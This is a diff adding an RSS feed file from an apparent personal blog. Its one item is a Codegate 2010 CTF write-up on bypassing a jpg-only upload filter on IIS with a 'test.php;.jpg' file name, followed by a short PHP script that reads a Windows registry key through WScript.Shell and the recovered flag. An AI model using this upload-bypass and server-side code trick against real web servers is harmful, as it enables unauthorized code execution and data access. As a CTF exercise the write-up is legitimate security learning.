@@ -1,0 +1,76 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<channel>
+   
+   	<title>RealJenius.com - Tag: IIS</title>
+   
+   <link>http://realjenius.com</link>
+   <description>I'm a software developer in the game industry, and have been (for better or worse) coding on the Java platform for the last decade. I also do all my own stunts.</description>
+   <language>en-us</language>
+   <managingEditor>R.J. Lorimer</managingEditor>
+   <atom:link href="rss" rel="self" type="application/rss+xml" />
+   
+	<item>
+  <title>Codegate 2010 Challenge 11 writeup</title>
+  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/18/codegate-2010-challenge-11-writeup.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2010-03-18T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/18/codegate-2010-challenge-11-writeup.html</guid>
+  <description><![CDATA[
+     <h2 id="Summary" style="font-family: Georgia, 'Bitstream Vera Serif', 'New York', Palatino, serif;font-weight: normal;letter-spacing: -0.018em;font-size: 20px;clear: none;color: #366d9c;border-bottom-width: 1px;border-bottom-style: solid;border-bottom-color: #ffdb4c;margin: 0px">
+  Summary<a title="Link to this section" href="#Summary"></a>
+</h2>
+
+<p><a href="http://ctf6.codegate.org/31337_/index.html"><span> </span>http://ctf6.codegate.org/31337_/index.html</a></p>
+
+<p>Get a value of HKLMSoftwarecodegate2010, it’s the flag.</p>
+
+<h2 id="Analysis" style="font-family: Georgia, 'Bitstream Vera Serif', 'New York', Palatino, serif;font-weight: normal;letter-spacing: -0.018em;font-size: 20px;clear: none;color: #366d9c;border-bottom-width: 1px;border-bottom-style: solid;border-bottom-color: #ffdb4c;margin: 0px">
+  Analysis<a title="Link to this section" href="#Analysis"></a>
+</h2>
+
+<p>At first when accessing the url, it shows up a page allow you to upload a jpeg image and only .jpg files. As I noticed, it serves by IIS. Suddenly, I remember of the vulnerability of IIS in processing image files. A little bit google show me the result. Ah ha, let’s test it by uploading a php file likes “test.php;.jpg”. Incredible!</p>
+
+<p style="text-indent: 0.5em">
+  Now, the only thing we have to do is writing some lines of php to read the REG key.
+</p>
+
+<pre style="background-color: #f7f7f7;margin-top: 1em;margin-right: 1.75em;margin-bottom: 1em;margin-left: 1.75em;padding: 0.25em;border: 1px solid #d7d7d7">regprint.php;.jpg
+&lt;?
+$shell = new COM("WScript.Shell") or die("Requires Windows Scripting Host");
+$devenvpath=$shell-&gt;RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\codegate2010");
+echo $devenvpath
+?&gt;</pre>
+
+<p>Then, execute it by <a href="http://ctf6.codegate.org/31337_/upload/regprint.php;.jpg"><span> </span>http://ctf6.codegate.org/31337_/upload/regprint.php;.jpg</a></p>
+
+<p style="text-indent: 0.5em">
+  <tt>LollerSkaterz_From_RoflCopters_With_Guinness</tt>
+</p>
+
+<p style="text-indent: 0.5em">
+  Easy game with 1200 point.
+</p>
+
+<h2 id="Vulnerability" style="font-family: Georgia, 'Bitstream Vera Serif', 'New York', Palatino, serif;font-weight: normal;letter-spacing: -0.018em;font-size: 20px;clear: none;color: #366d9c;border-bottom-width: 1px;border-bottom-style: solid;border-bottom-color: #ffdb4c;margin: 0px">
+  Vulnerability<a title="Link to this section" href="#Vulnerability"></a>
+</h2>
+
+<p>In facts, after the game thaidn said that it’s a fault of deploying the challenge, it’s designed to be passed by a 0-day of core php.</p>
+
+<h2 id="References" style="font-family: Georgia, 'Bitstream Vera Serif', 'New York', Palatino, serif;font-weight: normal;letter-spacing: -0.018em;font-size: 20px;clear: none;color: #366d9c;border-bottom-width: 1px;border-bottom-style: solid;border-bottom-color: #ffdb4c;margin: 0px">
+  References<a title="Link to this section" href="#References"></a>
+</h2>
+
+<ul>
+  <li><a href="http://soroush.secproject.com/blog/2009/12/microsoft-iis-semi-colon-vulnerability/"><span> </span>http://soroush.secproject.com/blog/2009/12/microsoft-iis-semi-colon-vulnerability/</a></li>
+  <li>Keywords: IIS, semi-colon vulnerability</li>
+</ul>
+
+
+  ]]></description>
+</item>
+
+</channel>
+</rss>
